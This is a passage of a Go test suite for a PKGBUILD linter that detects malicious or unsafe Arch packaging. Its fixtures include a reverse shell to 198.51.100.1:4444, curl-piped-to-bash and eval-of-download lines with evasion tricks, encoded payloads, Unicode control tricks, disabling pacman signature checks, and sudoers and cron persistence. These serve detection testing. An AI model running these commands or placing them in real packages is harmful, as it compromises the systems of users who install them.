		expectRule(t, "PB305", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  bash -i >/dev/tcp/198.51.100.1/4444 0<&1
}`)})
	})
	t.Run("PB306 indirect command", func(t *testing.T) {
		expectRule(t, "PB306", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  x=curl
  "${!x}" https://example.com
}`)})
	})
	t.Run("PB307 hex escape payload", func(t *testing.T) {
		expectRule(t, "PB307", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  p=$'\x62\x61\x73\x68\x20\x2d\x63\x20\x65\x76\x69\x6c'
}`)})
	})
	t.Run("PB307 not for a run of one repeated byte", func(t *testing.T) {
		// epsonscan2 NUL-pads a path it patches into a binary.
		expectNoRule(t, "PB307", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  bbe -e "s|x86_64-linux-gnu/epsonscan2/|epsonscan2/`+strings.Repeat(`\x00`, 16)+`|" -o out in
}`)})
	})
	t.Run("PB306 not for a command path under srcdir", func(t *testing.T) {
		// jitsi-meet-desktop-bin picks the AppImage by architecture.
		expectNoRule(t, "PB306", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  "${srcdir}/demo-${arch[0]}-${pkgver}.AppImage" --appimage-extract
}`)})
		expectRule(t, "PB306", map[string]string{"PKGBUILD": pkgbuildWith("", `
prepare() {
  "${srcdir}/../demo-${arch[0]}" --run
}`)})
	})
	t.Run("PB307 base64 blob payload", func(t *testing.T) {
		expectRule(t, "PB307", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  payload='`+strings.Repeat("QmFzZTY0", 16)+`'
}`)})
	})
	t.Run("PB307 not for checksum arrays", func(t *testing.T) {
		// The first line is exempted by its sums= assignment, the
		// continuation line by being pure hex.
		digest := strings.Repeat("deadbeef", 16)
		expectNoRule(t, "PB307", map[string]string{"PKGBUILD": pkgbuildWith("", `
sha512sums=('`+digest+`'
            '`+digest+`')`)})
	})
	t.Run("PB308 overrides a makepkg internal", func(t *testing.T) {
		expectRule(t, "PB308", map[string]string{"PKGBUILD": pkgbuildWith("", `
verify_integrity_one() {
  return 0
}`)})
	})
	t.Run("PB308 ordinary package functions are fine", func(t *testing.T) {
		expectNoRule(t, "PB308", map[string]string{"PKGBUILD": cleanPKGBUILD})
	})
	t.Run("PB309 bidi override control", func(t *testing.T) {
		expectRule(t, "PB309", map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  make ‮install\n}")})
	})
	t.Run("PB309 zero-width character", func(t *testing.T) {
		expectRule(t, "PB309", map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  ma​ke\n}")})
	})
	t.Run("PB309 plain ASCII is clean", func(t *testing.T) {
		expectNoRule(t, "PB309", map[string]string{"PKGBUILD": cleanPKGBUILD})
	})
}

// Adversarial variants that trivially evade regex scanners but not an AST.
func TestAdversarialEvasion(t *testing.T) {
	t.Run("line continuations inside the pipeline", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  curl \
    -fsSL \
    https://example.com/x.sh \
    | \
    bash
}`)})
	})
	t.Run("quote-splitting the command name", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  'cu'"rl" https://example.com/x.sh | 'ba'sh
}`)})
	})
	t.Run("wrapper commands around the downloader", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  env -i curl https://example.com/x.sh | env bash
}`)})
	})
	t.Run("full path to interpreter", func(t *testing.T) {
		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  wget -qO- https://example.com/x.sh | /usr/bin/bash
}`)})
	})
	t.Run("eval of downloaded content", func(t *testing.T) {
		files := map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  eval "$(curl -s https://example.com/x.sh)"
}`)}
		expectRule(t, "PB302", files)
		findings := lint(t, files)
		for _, f := range findings {
			if f.RuleID == "PB302" && f.Severity != Critical {
				t.Errorf("eval of download should be critical, got %s", f.Severity)
			}
		}
	})
}

func TestFSRules(t *testing.T) {
	t.Run("PB401 write to home", func(t *testing.T) {
		expectRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  echo 'alias x=y' >> "$HOME/.bashrc"
}`)})
	})
	t.Run("PB401 cp to /etc", func(t *testing.T) {
		expectRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  cp demo.conf /etc/demo.conf
}`)})
	})
	t.Run("PB401 install into pkgdir fine", func(t *testing.T) {
		expectNoRule(t, "PB401", map[string]string{"PKGBUILD": cleanPKGBUILD})
	})
	t.Run("PB401 scriptlet writes to the live system fine", func(t *testing.T) {
		// A scriptlet runs after pacman has unpacked the package; writing to
		// absolute paths is what it is for. $pkgdir does not even exist there.
		expectNoRule(t, "PB401", map[string]string{
			"PKGBUILD": pkgbuildWith("", "install=demo.install"),
			"demo.install": `post_install() {
  cp /usr/share/demo/demo.conf /etc/demo.conf
  echo restored >>/var/lib/demo/state
}`,
		})
	})
	t.Run("PB401 scriptlet hook in PKGBUILD is not a build write", func(t *testing.T) {
		// pacman only calls hooks out of the install= file, so a post_install
		// defined in the PKGBUILD is dead code — never a build-time write.
		expectNoRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
post_install() {
  cp demo.conf /etc/demo.conf
}`)})
	})
	t.Run("PB401 redirect in a PKGBUILD scriptlet hook is dead code too", func(t *testing.T) {
		// The redirect walk has to make the same call the command path does.
		expectNoRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
post_install() {
  echo done >/etc/demo.conf
}`)})
	})
	t.Run("PB401 tty and shm writes fine", func(t *testing.T) {
		expectNoRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  echo building >/dev/tty
  make >/dev/shm/demo.log
}`)})
	})
	t.Run("PB401 a path the function restaged is not the live one", func(t *testing.T) {
		// The dm-fotowelt shape: a top-level install prefix that package()
		// rebinds under $pkgdir before using it. Rendering the later uses
		// against the top-level value reports writes to /usr/share that the
		// build never performs.
		expectNoRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
_installDir=/usr/share/demo
package() {
  _installDir=$pkgdir$_installDir
  mkdir -p $_installDir
  rm -rf $_installDir/.log
}`)})
	})
	t.Run("PB401 a redirect through a restaged path is not the live one", func(t *testing.T) {
		// The same shape through a redirect instead of a command: the target
		// must render against the function's view, not the file-level value.
		expectNoRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
_installDir=/usr/share/demo
package() {
  _installDir=$pkgdir$_installDir
  echo installed >"$_installDir/log"
}`)})
	})
	t.Run("PB401 a path an earlier phase restaged is not the live one", func(t *testing.T) {
		// makepkg runs prepare, build, check and package in one shell, so a
		// name build() rewrote is still rewritten by the time package() runs.
		expectNoRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
_out=/opt/demo
build() {
  _out=$srcdir/out
}
package() {
  mkdir -p $_out
}`)})
	})
	t.Run("PB401 a local in an earlier phase dies with it", func(t *testing.T) {
		// prepare()'s `local _dir` shadows the file-level value only inside
		// prepare; by the time package() runs, $_dir is /opt/demo again, and
		// the write it names is real.
		expectRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
_dir=/opt/demo
prepare() {
  local _dir="$srcdir/tmp"
  mkdir -p "$_dir"
}
package() {
  mkdir -p "$_dir"
}`)})
	})
	t.Run("PB401 a path a later phase rebinds is still checked", func(t *testing.T) {
		// package() runs last: nothing it does reaches back into build().
		expectRule(t, "PB401", map[string]string{"PKGBUILD": pkgbuildWith("", `
_out=/opt/demo
build() {
  mkdir -p $_out
}
package() {
  _out=$pkgdir/opt/demo
  mkdir -p $_out
}`)})
	})
	t.Run("PB402 sudo", func(t *testing.T) {
		expectRule(t, "PB402", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  sudo make install
}`)})
	})
	t.Run("PB402 sudo in scriptlet fine", func(t *testing.T) {
		// Scriptlets already run as root, so there is nothing to escalate; the
		// common use is `sudo -u` dropping *down* to an ordinary user.
		expectNoRule(t, "PB402", map[string]string{
			"PKGBUILD": pkgbuildWith("", "install=demo.install"),
			"demo.install": `post_install() {
  sudo -u demo /usr/bin/demo --migrate
}`,
		})
	})
	t.Run("PB403 setuid chmod", func(t *testing.T) {
		expectRule(t, "PB403", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  chmod u+s "$pkgdir/usr/bin/demo"
}`)})
	})
	t.Run("PB403 setuid install mode", func(t *testing.T) {
		expectRule(t, "PB403", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  install -Dm4755 demo "$pkgdir/usr/bin/demo"
}`)})
	})
	t.Run("PB403 ordinary install mode fine", func(t *testing.T) {
		expectNoRule(t, "PB403", map[string]string{"PKGBUILD": cleanPKGBUILD})
	})
	t.Run("PB403 setcap in package()", func(t *testing.T) {
		expectRule(t, "PB403", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  setcap cap_net_raw+ep "$pkgdir/usr/bin/demo"
}`)})
	})
	t.Run("PB403 setcap in post_install scriptlet", func(t *testing.T) {
		expectRule(t, "PB403", map[string]string{
			"PKGBUILD": pkgbuildWith("", "install=demo.install"),
			"demo.install": `post_install() {
  setcap cap_setuid+ep /usr/bin/demo
}`,
		})
	})
	t.Run("PB403 setcap -r removal is fine", func(t *testing.T) {
		expectNoRule(t, "PB403", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  setcap -r "$pkgdir/usr/bin/demo"
}`)})
	})
	t.Run("PB404 make install without destdir", func(t *testing.T) {
		expectRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  make install
}`)})
	})
	t.Run("PB404 DESTDIR arg is fine", func(t *testing.T) {
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  make DESTDIR="$pkgdir" install
}`)})
	})
	t.Run("PB404 exported DESTDIR is fine", func(t *testing.T) {
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  export DESTDIR="$pkgdir"
  ninja -C build install
}`)})
	})
	t.Run("PB404 cmake --install with prefix is fine", func(t *testing.T) {
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  cmake --install build --prefix "$pkgdir/usr"
}`)})
	})
	t.Run("PB404 install outside package() ignored", func(t *testing.T) {
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  make install
}`)})
	})
	t.Run("PB404 prefix bound at configure time is fine", func(t *testing.T) {
		// The build tree already stages into $pkgdir, so the bare install in
		// package() never touches the live system.
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  cmake -B build -DCMAKE_INSTALL_PREFIX="$pkgdir/usr"
  cmake --build build
}
package() {
  cmake --install build
}`)})
	})
	t.Run("PB404 configure prefix without pkgdir is still flagged", func(t *testing.T) {
		expectRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  cmake -B build -DCMAKE_INSTALL_PREFIX=/usr
  cmake --build build
}
package() {
  cmake --install build
}`)})
	})
	t.Run("PB404 destdir bound by a called helper is fine", func(t *testing.T) {
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
_setup() {
  export PERL_MM_OPT="INSTALLDIRS=vendor DESTDIR='$pkgdir'"
}
package() {
  _setup
  make install
}`)})
	})
	t.Run("PB404 install into a pkgdir virtualenv is fine", func(t *testing.T) {
		// The activated venv lives in the staging tree, so pip writes there.
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  python -m venv "$pkgdir/usr/lib/demo"
  source "$pkgdir/usr/lib/demo/bin/activate"
  pip install -r requirements.txt
}`)})
	})
	t.Run("PB404 pip install with no venv is still flagged", func(t *testing.T) {
		expectRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  pip install --break-system-packages installer
}`)})
	})
	t.Run("PB404 staging bound by a non-standard variable is fine", func(t *testing.T) {
		expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  make INSTALL_ROOT="$pkgdir" install
}`)})
	})
	t.Run("PB404 prefix inside the build tree is fine", func(t *testing.T) {
		// aseprite stages into a scratch directory, then copies what it wants
		// into $pkgdir by hand; the install never reaches the live system.
		for _, prefix := range []string{"--prefix=staging", "--prefix staging", `--prefix "$srcdir/staging"`, "--prefix=./out/usr", `--prefix="$srcdir"`, `--prefix="${srcdir}/"`} {
			expectNoRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  cd "$srcdir"
  cmake --install build `+prefix+` --strip
  install -Dm755 staging/bin/demo "$pkgdir/usr/bin/demo"
}`)})
		}
	})
	t.Run("PB404 prefix outside the build tree is still flagged", func(t *testing.T) {
		for _, prefix := range []string{"--prefix=/usr", "--prefix=../../usr", `--prefix "$HOME/.local"`, `--prefix "$srcdir/../../usr"`} {
			expectRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  cmake --install build `+prefix+`
}`)})
		}
	})
	t.Run("PB404 an opaque or mixed destination is still flagged", func(t *testing.T) {
		for _, body := range []string{
			`cmake --install build --prefix="$(compute_prefix)"`,
			`cmake --install build --prefix="staging$((1))"`,
			`pip install --root=/ --prefix=usr .`, // every destination must stay inside
			`pip install --prefix=usr --root=/ .`,
		} {
			expectRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", "package() {\n  cd \"$srcdir\"\n  "+body+"\n}")})
		}
	})
	t.Run("PB404 a helper or unnamed cd leaves the build tree", func(t *testing.T) {
		for _, body := range []string{
			"_goto_root\n  cmake --install build --prefix=usr",
			"_outer\n  cmake --install build --prefix=usr",
			"cd -\n  cmake --install build --prefix=usr",
			"pushd +1\n  cmake --install build --prefix=usr",
			"pushd -0\n  cmake --install build --prefix=usr",
			"cd \"$(_where)\"\n  cmake --install build --prefix=usr",
		} {
			expectRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
_goto_root() {
  cd /
}
_outer() {
  _goto_root
}
package() {
  `+body+`
}`)})
		}
	})
	t.Run("PB404 cargo --target is a triple, not a destination", func(t *testing.T) {
		expectRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  cargo install --target x86_64-unknown-linux-gnu --path .
}`)})
	})
	t.Run("PB404 prefix naming a sibling of srcdir is still flagged", func(t *testing.T) {
		expectRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  cmake --install build --prefix="${srcdir}x/usr"
}`)})
	})
	t.Run("PB404 relative prefix after leaving the build tree is still flagged", func(t *testing.T) {
		for _, cd := range []string{"cd /", "cd", "pushd /opt", `cd "$HOME"`} {
			expectRule(t, "PB404", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  `+cd+`
  cmake --install "$srcdir/build" --prefix=usr
}`)})
		}
	})
	t.Run("PB405 write to pacman.conf", func(t *testing.T) {
		files := map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  echo 'SigLevel = Never' >> /etc/pacman.conf
}`)}
		expectRule(t, "PB405", files)
		expectNoRule(t, "PB401", files) // PB405 owns sensitive paths; no double report
	})
	t.Run("PB405 pacman-key", func(t *testing.T) {
		expectRule(t, "PB405", map[string]string{
			"PKGBUILD": pkgbuildWith("", "install=demo.install"),
			"demo.install": `post_install() {
  pacman-key --recv-keys DEADBEEF
}`,
		})
	})
	t.Run("PB405 staged pacman.conf under pkgdir is fine", func(t *testing.T) {
		expectNoRule(t, "PB405", map[string]string{"PKGBUILD": pkgbuildWith("", `
package() {
  install -Dm644 pacman.conf "$pkgdir/etc/pacman.conf"
}`)})
	})
	t.Run("PB405 removing a sensitive path is not a write to it", func(t *testing.T) {
		// Retracting a sudoers fragment an older release shipped withdraws the
		// escalation path; reporting it as granting one is backwards, and
		// PB502 does not count a removal as persistence either.
		files := map[string]string{
			"PKGBUILD":     pkgbuildWith("", "install=demo.install"),
			"demo.install": "post_remove() {\n  rm -f /etc/sudoers.d/demo\n}\n",
		}
		expectNoRule(t, "PB405", files)
		expectNoRule(t, "PB502", files)
	})
	t.Run("PB405 skips a build-time removal but PB401 still reports it", func(t *testing.T) {
		// writeTargetViolation defers sensitive paths to PB405, and PB405
		// stays silent on deleters by design — so the deferral must lapse for
		// them, or erasing pacman.conf becomes the one /etc write nothing
		// reports while `rm /etc/other.conf` next to it is an error.
		files := map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  rm -f /etc/pacman.conf
}`)}
		expectNoRule(t, "PB405", files)
		expectRule(t, "PB401", files)
	})
	t.Run("PB405 writing a sudoers fragment is still critical", func(t *testing.T) {
		expectRule(t, "PB405", map[string]string{
			"PKGBUILD":     pkgbuildWith("", "install=demo.install"),
			"demo.install": "post_install() {\n  install -Dm440 /dev/null /etc/sudoers.d/demo\n}\n",
		})
	})
}

func TestScriptletRules(t *testing.T) {
	base := pkgbuildWith("", "install=demo.install")
	t.Run("PB501 curl in post_install", func(t *testing.T) {
		expectRule(t, "PB501", map[string]string{
			"PKGBUILD": base,
			"demo.install": `post_install() {
  curl -s https://example.com/track
}`,
		})
	})
	t.Run("PB502 crontab", func(t *testing.T) {
		expectRule(t, "PB502", map[string]string{
			"PKGBUILD": base,
			"demo.install": `post_install() {
  crontab /tmp/x
}`,
		})
	})
	t.Run("PB502 login shell user", func(t *testing.T) {
		expectRule(t, "PB502", map[string]string{
			"PKGBUILD": base,
			"demo.install": `post_install() {
  useradd -r -s /bin/bash demo
}`,
		})
	})
	t.Run("clean scriptlet fine", func(t *testing.T) {
		ids := ruleIDs(lint(t, map[string]string{
			"PKGBUILD": base,
			"demo.install": `post_install() {
  update-desktop-database -q
}`,
		}))
		for _, id := range []string{"PB501", "PB502"} {
			if ids[id] != 0 {
				t.Errorf("unexpected %s: %v", id, ids)
			}
		}
	})
}

func TestConsistencyRules(t *testing.T) {
	t.Run("PB601 pkgver mismatch", func(t *testing.T) {
		expectRule(t, "PB601", map[string]string{
			"PKGBUILD": cleanPKGBUILD,
			".SRCINFO": `pkgbase = demo
	pkgver = 9.9.9
	pkgrel = 1
	url = https://github.com/example/demo
	source = demo-1.0.0.tar.gz::https://github.com/example/demo/archive/v1.0.0.tar.gz

pkgname = demo
`,
		})
	})
	t.Run("PB601 matching srcinfo fine", func(t *testing.T) {
		expectNoRule(t, "PB601", map[string]string{
			"PKGBUILD": cleanPKGBUILD,
			".SRCINFO": `pkgbase = demo
	pkgver = 1.0.0
	pkgrel = 1
	url = https://github.com/example/demo
	source = demo-1.0.0.tar.gz::https://github.com/example/demo/archive/v1.0.0.tar.gz

pkgname = demo
`,
		})
	})
	t.Run("PB602 curl in pkgver", func(t *testing.T) {
		expectRule(t, "PB602", map[string]string{"PKGBUILD": pkgbuildWith("", `
pkgver() {
  curl -s https://example.com/latest
}`)})
	})
	t.Run("PB603 provides claiming pacman", func(t *testing.T) {
		expectRule(t, "PB603", map[string]string{"PKGBUILD": pkgbuildWith("", `provides=('pacman')`)})
	})
	t.Run("PB603 versioned provides claiming glibc", func(t *testing.T) {
		expectRule(t, "PB603", map[string]string{"PKGBUILD": pkgbuildWith("", `provides=('glibc=2.39')`)})
	})
	t.Run("PB603 replaces claiming systemd", func(t *testing.T) {
		expectRule(t, "PB603", map[string]string{"PKGBUILD": pkgbuildWith("", `replaces=('systemd')`)})
	})
	t.Run("PB603 conflicts claiming sudo", func(t *testing.T) {
		expectRule(t, "PB603", map[string]string{"PKGBUILD": pkgbuildWith("", `conflicts=('sudo')`)})
	})
	t.Run("PB603 arch-specific provides claiming pacman", func(t *testing.T) {
		expectRule(t, "PB603", map[string]string{"PKGBUILD": pkgbuildWith("", `provides_x86_64=('pacman')`)})
	})
	t.Run("PB603 variant package providing its parent is fine", func(t *testing.T) {
		expectNoRule(t, "PB603", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=pacman-git
pkgver=1
pkgrel=1
url='https://example.com'
source=()`, `provides=("pacman=$pkgver")
conflicts=('pacman')`)})
	})
	t.Run("PB603 ordinary provides is fine", func(t *testing.T) {
		expectNoRule(t, "PB603", map[string]string{"PKGBUILD": pkgbuildWith("", `provides=('libfoo.so')`)})
	})
}

func TestCorrectnessRules(t *testing.T) {
	// A minimal valid metadata header these tests vary one field at a time.
	valid := `pkgname=demo
pkgver=1.0.0
pkgrel=1
arch=('x86_64')`

	t.Run("PB701 invalid pkgname characters", func(t *testing.T) {
		expectRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname=Foo:Bar\npkgver=1\npkgrel=1\narch=('any')\n"})
	})
	t.Run("PB701 leading hyphen", func(t *testing.T) {
		expectRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname=-demo\npkgver=1\npkgrel=1\narch=('any')\n"})
	})
	t.Run("PB701 valid name is fine", func(t *testing.T) {
		expectNoRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname=foo-bar_2.0+git\npkgver=1\npkgrel=1\narch=('any')\n"})
	})
	t.Run("PB701 array pkgname (split package) validated per element", func(t *testing.T) {
		expectRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname=('good' 'Bad:Name')\npkgver=1\npkgrel=1\narch=('any')\n"})
	})
	// Bash brace-expands array assignments before makepkg ever sees them, so
	// the braces are not part of any package's name. Both of these declare a
	// perfectly ordinary split package.
	t.Run("PB701 brace-expanded pkgname is fine", func(t *testing.T) {
		expectNoRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname=({,python-}open3d)\npkgver=1\npkgrel=1\narch=('any')\n"})
	})
	t.Run("PB701 brace-expanded pkgname with a suffix is fine", func(t *testing.T) {
		expectNoRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname=(openscq30-{cli,gui})\npkgver=1\npkgrel=1\narch=('any')\n"})
	})
	// Expansion must not launder a genuinely bad name: every expanded element
	// is still validated on its own.
	t.Run("PB701 brace expansion still catches a bad element", func(t *testing.T) {
		expectRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname=(demo-{cli,Bad:Gui})\npkgver=1\npkgrel=1\narch=('any')\n"})
	})
	// A scalar assignment is not brace-expanded by bash, so the braces really
	// are literal characters in the name.
	t.Run("PB701 braces in a scalar pkgname are literal", func(t *testing.T) {
		expectRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname={,python-}open3d\npkgver=1\npkgrel=1\narch=('any')\n"})
	})

	t.Run("PB702 pkgver with hyphen", func(t *testing.T) {
		expectRule(t, "PB702", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1.2.3-beta\npkgrel=1\narch=('any')\n"})
	})
	t.Run("PB702 pkgver with colon", func(t *testing.T) {
		expectRule(t, "PB702", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1:2.3\npkgrel=1\narch=('any')\n"})
	})
	t.Run("PB702 valid pkgver is fine", func(t *testing.T) {
		expectNoRule(t, "PB702", map[string]string{"PKGBUILD": valid + "\n"})
	})
	t.Run("PB702 flagged even with a pkgver() function (makepkg lints the literal first)", func(t *testing.T) {
		expectRule(t, "PB702", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1.2.3-beta\npkgrel=1\narch=('any')\npkgver() {\n  echo 1\n}\n"})
	})

	t.Run("PB703 non-numeric pkgrel", func(t *testing.T) {
		expectRule(t, "PB703", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1a\narch=('any')\n"})
	})
	t.Run("PB703 decimal pkgrel is fine", func(t *testing.T) {
		expectNoRule(t, "PB703", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1.5\narch=('any')\n"})
	})

	t.Run("PB704 non-integer epoch", func(t *testing.T) {
		expectRule(t, "PB704", map[string]string{"PKGBUILD": valid + "\nepoch=1.0\n"})
	})
	t.Run("PB704 integer epoch is fine", func(t *testing.T) {
		expectNoRule(t, "PB704", map[string]string{"PKGBUILD": valid + "\nepoch=2\n"})
	})

	t.Run("PB705 backup leading slash", func(t *testing.T) {
		expectRule(t, "PB705", map[string]string{"PKGBUILD": valid + "\nbackup=('/etc/foo.conf')\n"})
	})
	t.Run("PB705 relative backup is fine", func(t *testing.T) {
		expectNoRule(t, "PB705", map[string]string{"PKGBUILD": valid + "\nbackup=('etc/foo.conf')\n"})
	})

	t.Run("PB706 unknown option", func(t *testing.T) {
		expectRule(t, "PB706", map[string]string{"PKGBUILD": valid + "\noptions=('!striped')\n"})
	})
	t.Run("PB706 backslash-escaped negation is fine", func(t *testing.T) {
		// Outside an interactive shell there is no history expansion to escape,
		// so bash hands makepkg a plain "!strip".
		expectNoRule(t, "PB706", map[string]string{"PKGBUILD": valid + "\noptions=(\\!strip \\!debug)\n"})
	})
	t.Run("PB706 known options are fine", func(t *testing.T) {
		expectNoRule(t, "PB706", map[string]string{"PKGBUILD": valid + "\noptions=('!strip' 'lto' '!debug')\n"})
	})

	t.Run("PB707 provides comparison operator", func(t *testing.T) {
		expectRule(t, "PB707", map[string]string{"PKGBUILD": valid + "\nprovides=('libfoo<2')\n"})
	})
	t.Run("PB707 exact version provide is fine", func(t *testing.T) {
		expectNoRule(t, "PB707", map[string]string{"PKGBUILD": valid + "\nprovides=('libfoo=1.9')\n"})
	})

	t.Run("PB708 scalar list field", func(t *testing.T) {
		expectRule(t, "PB708", map[string]string{"PKGBUILD": valid + "\ndepends=gtk3\n"})
	})
	t.Run("PB708 array scalar field", func(t *testing.T) {
		expectRule(t, "PB708", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('any')\npkgdesc=('a demo')\n"})
	})
	t.Run("PB708 correct types are fine", func(t *testing.T) {
		expectNoRule(t, "PB708", map[string]string{"PKGBUILD": valid + "\ndepends=('gtk3')\n"})
	})
	t.Run("PB708 scalar pkgname is allowed (not a schema array)", func(t *testing.T) {
		expectNoRule(t, "PB708", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('any')\n"})
	})
	t.Run("PB708 arch-specific scalar list field", func(t *testing.T) {
		expectRule(t, "PB708", map[string]string{"PKGBUILD": valid + "\ndepends_x86_64=gtk3\n"})
	})
	t.Run("PB708 indexed element write is an array write, not a scalar", func(t *testing.T) {
		expectNoRule(t, "PB708", map[string]string{"PKGBUILD": valid + `
source=("https://example.com/a.tar.gz" "https://example.com/b.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')
sha256sums[1]='SKIP'
`})
	})
	t.Run("PB708 arch-specific array is fine", func(t *testing.T) {
		expectNoRule(t, "PB708", map[string]string{"PKGBUILD": valid + "\ndepends_x86_64=('gtk3')\n"})
	})
	t.Run("PB708 suffix for an undeclared arch is ignored", func(t *testing.T) {
		expectNoRule(t, "PB708", map[string]string{"PKGBUILD": valid + "\ndepends_aarch64=gtk3\n"})
	})

	t.Run("PB709 non-override var in package function", func(t *testing.T) {
		expectRule(t, "PB709", map[string]string{"PKGBUILD": valid + "\npackage() {\n  makedepends=('go')\n  make DESTDIR=\"$pkgdir\" install\n}\n"})
	})
	t.Run("PB709 override var in package function is fine", func(t *testing.T) {
		expectNoRule(t, "PB709", map[string]string{"PKGBUILD": valid + "\npackage() {\n  depends=('glibc')\n  make DESTDIR=\"$pkgdir\" install\n}\n"})
	})
	t.Run("PB709 local var in package function is fine", func(t *testing.T) {
		expectNoRule(t, "PB709", map[string]string{"PKGBUILD": valid + "\npackage() {\n  somevar=1\n  make DESTDIR=\"$pkgdir\" install\n}\n"})
	})
	t.Run("PB709 local declaration of a schema var is fine", func(t *testing.T) {
		expectNoRule(t, "PB709", map[string]string{"PKGBUILD": valid + "\npackage() {\n  local pkgver=tmp\n  make DESTDIR=\"$pkgdir\" install\n}\n"})
	})
	t.Run("PB709 arch-specific non-override var in package function", func(t *testing.T) {
		expectRule(t, "PB709", map[string]string{"PKGBUILD": valid + "\npackage() {\n  makedepends_x86_64=('go')\n  make DESTDIR=\"$pkgdir\" install\n}\n"})
	})
	t.Run("PB709 local-declared schema var is not a global override", func(t *testing.T) {
		// makepkg's regex only matches bare assignments, not `local`/`declare`.
		expectNoRule(t, "PB709", map[string]string{"PKGBUILD": valid + "\npackage() {\n  local makedepends=('go')\n  make DESTDIR=\"$pkgdir\" install\n}\n"})
	})
	t.Run("PB709 nested schema var is still flagged", func(t *testing.T) {
		expectRule(t, "PB709", map[string]string{"PKGBUILD": valid + "\npackage() {\n  if true; then\n    source=('x')\n  fi\n}\n"})
	})

	t.Run("PB710 missing arch", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\n"})
	})
	t.Run("PB710 any combined with concrete arch", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('any' 'x86_64')\n"})
	})
	t.Run("PB710 duplicate arch", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('x86_64' 'x86_64')\n"})
	})
	t.Run("PB710 invalid arch characters", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('x86-64')\n"})
	})
	t.Run("PB710 valid arch is fine", func(t *testing.T) {
